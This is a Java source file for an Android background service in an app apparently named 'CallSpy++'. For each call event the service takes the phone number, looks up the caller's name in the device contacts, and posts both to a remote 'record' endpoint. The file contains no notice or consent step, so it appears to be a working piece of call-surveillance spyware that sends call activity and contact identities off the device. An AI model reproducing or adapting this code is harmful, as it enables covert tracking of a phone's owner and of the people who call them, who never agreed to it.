package com.gamechange.adhityan.callspyplusplus.services;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;
import android.util.Pair;

import com.gamechange.adhityan.callspyplusplus.libs.Utilities;
import com.gamechange.adhityan.callspyplusplus.libs.api.APICall;
import com.gamechange.adhityan.callspyplusplus.libs.api.apiInterface;
import com.gamechange.adhityan.callspyplusplus.superclasses.XApplication;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class NotifyService extends IntentService implements apiInterface {
    public NotifyService() {
        super("NotifyService");
        //setIntentRedelivery(true);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        String number = intent.getStringExtra("number");
        String unformattedNumber = intent.getStringExtra("unformattedNumber");
        String source = intent.getStringExtra("source");

        processNumber(number, unformattedNumber, source);
    }

    public void processNumber(String number, String unformattedNumber, String source) {
        List<Pair<String, String>> post = new ArrayList<>(6);
        post.add(new Pair<>("number", number));
        post.add(new Pair<>("unformattedNumber", unformattedNumber));
        post.add(new Pair<>("source", source));
        post.add(new Pair<>("name", getContactName(unformattedNumber, this)));

        Utilities.logDebug("Processing: " + number + ", " + unformattedNumber + ", " + source);
        new APICall(this, XApplication.API_HOST + "record", "record", null, post);
    }

    private String getContactName(String phoneNumber, Context context) {
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) return null;

        String contactName = null;
        if(cursor.moveToFirst()) contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        if(!cursor.isClosed()) cursor.close();
        return contactName;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        APICall.init();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public void apiResponse(String response, String code) {
        Utilities.logDebug("Response: " + response);
    }

    @Override
    public void apiError(String message, String code) {
        Utilities.logError("Get phone error: " + message);
    }

    @Override
    public void connectionError(int Status, String code) {
        Utilities.logWarning("Connection failed.");
    }
}
